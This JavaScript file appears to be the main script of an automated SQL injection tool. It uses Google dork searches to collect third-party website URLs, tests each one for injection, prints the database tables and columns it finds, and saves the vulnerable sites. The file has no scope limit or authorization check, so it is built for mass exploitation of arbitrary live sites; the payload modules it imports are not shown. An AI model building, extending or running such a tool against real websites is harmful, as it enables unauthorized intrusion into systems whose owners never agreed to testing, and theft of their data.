import { searchGoogle } from './src/google-search.js';
import { testSQLInjection } from './src/sql-injection.js';
import { isValidTestUrl } from './src/url-utils.js';
import { urlStore } from './src/url-store.js';
import { ResultStorage } from './src/result-storage.js';
import { DORK_PATTERNS, GOOGLE_SEARCH_DELAY, MAX_RESULTS } from './src/config.js'; // Adicione MAX_RESULTS ao seu config
import { delay } from './src/utils.js';

const resultStorage = new ResultStorage();

async function processSingleUrl(url) {
  if (!isValidTestUrl(url) || urlStore.isUrlTested(url)) {
    if (urlStore.isUrlTested(url)) {
      console.log(`[-] URL já testada: ${url}`);
    }
    return;
  }

  console.log(`\n[+] Testing URL: ${url}`);
  urlStore.markUrlAsTested(url);
  
  try {
    const result = await testSQLInjection(url);
    if (result.vulnerable) {
      await displayResults(result);
      await resultStorage.saveVulnerableUrl(url, result);
    }
  } catch (error) {
    console.error(`Error testing URL: ${url} - ${error.message}`);
  }
  
  // Wait between tests
  await delay(2000);
}

async function displayResults(result) {
  console.log('\n[!] Vulnerability confirmed!');
  
  if (result.tables.size > 0) {
    console.log('[+] Database tables found:');
    for (const table of result.tables) {
      console.log(`  - ${table}`);
    }
  }
  
  if (result.columns.length > 0) {
    console.log('[+] Columns found:');
    for (const column of result.columns) {
      console.log(`  - ${column}`);
    }
  }
}

async function main() {
  console.log('=== SQL Injection Vulnerability Scanner Started ===\n');

  for (const dork of DORK_PATTERNS) {
    console.log(`[*] Searching for: ${dork}`);
    try {
      const urls = await searchGoogle(dork, MAX_RESULTS); // Passando MAX_RESULTS para buscar mais URLs
      for (const url of urls) {
        await processSingleUrl(url);
      }
    } catch (error) {
      console.error(`Error searching for dork: ${dork} - ${error.message}`);
    }
    
    // Wait between Google searches
    console.log(`\n[*] Waiting ${GOOGLE_SEARCH_DELAY/1000} seconds before next search...`);
    await delay(GOOGLE_SEARCH_DELAY);
  }
  
  try {
    await displaySummary();
  } catch (error) {
    console.error(`Error displaying summary: ${error.message}`);
  }
}

async function displaySummary() {
  const stats = urlStore.getStats();
  console.log('\n=== Scan Complete ===');
  console.log(`Total URLs tested: ${stats.totalTested}`);
  console.log(`Vulnerable URLs found: ${stats.totalVulnerable}`);
  console.log(`Unique domains scanned: ${stats.uniqueDomains}`);
  await resultStorage.saveScanSummary(stats, urlStore.vulnerableUrls);
}

main().catch(console.error);